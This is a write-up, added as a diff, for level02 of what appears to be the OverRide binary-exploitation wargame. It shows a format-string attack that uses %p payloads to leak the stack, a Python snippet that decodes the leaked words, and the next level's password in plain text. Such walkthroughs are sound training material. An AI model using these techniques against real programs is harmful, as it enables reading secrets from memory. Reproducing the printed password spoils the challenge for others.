@@ -1,0 +1,64 @@
+
+
+in this level we have just a main
+
+and in the main it takes with a secured fgets.. a username and a password
+the overflow is where it uses printf to print the buffer directly and not secure it with %s
+
+-------------------------------------
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %x %x %x
+--[ Password: oioi
+*****************************************
+ffffe4c0 0 6f does not have access!
+level02@OverRide:~$
+-------------------------------------
+
+the program reads from the "/home/users/level03/.pass""
+and store it in the stack.. so we neeed to read the addresses and try to get the flag from there
+
+we read from the stack to check the offset
+-------------------------------------
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+--[ Password: hi
+*****************************************
+AAAA 0x7fffffffe4c0 (nil) 0x68 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6b8 0x1f7ff9a08 0x6968 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x2070252041414141 0x7025207025207025 0x2520702520702520 does not have access!
+level02@OverRide:~$
+-------------------------------------
+
+we see that the offset is in 28 where 0x2070252041414141 is.
+
+so the flag is between that offset.. if we check at offset 22 we will notice some data
+stored and as we know that the flag is 40 long so we notice that the 5 addresses are all suspecious
+let's try to decode them and we see
+-------------------------------------
+addresses = "0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d"
+addresses = addresses.replace("0x", '')
+addresses = addresses.split(" ")
+
+result = ""
+for chunk in addresses:
+	result += chunk.decode("hex")[::-1]
+
+print result
+
+----> Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+-------------------------------------
+
+we got something that looks like a flag to us so we tried it:
+-------------------------------------
+level02@OverRide:~$ su level03
+Password:
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
+level03@OverRide:~$
+-------------------------------------
